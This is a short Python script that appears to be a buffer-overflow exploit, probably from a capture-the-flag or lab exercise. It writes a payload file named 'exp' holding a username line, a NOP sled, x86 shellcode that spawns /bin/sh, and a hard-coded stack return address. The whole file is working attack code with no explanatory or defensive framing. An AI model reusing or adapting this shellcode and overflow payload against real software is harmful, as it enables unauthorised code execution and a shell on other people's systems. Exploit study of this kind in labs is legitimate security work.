#!/usr/bin/python
import sys
def p(x):
    sys.stdout.write(x)

print("exploit begin")
buf = b"\x90"*60
buf += b"\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68"
buf += b"\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
buf += b"\xac\xd1\xff\xff"
with open("exp", "wb+") as file:
    file.write(b"us3rname\n"+buf)

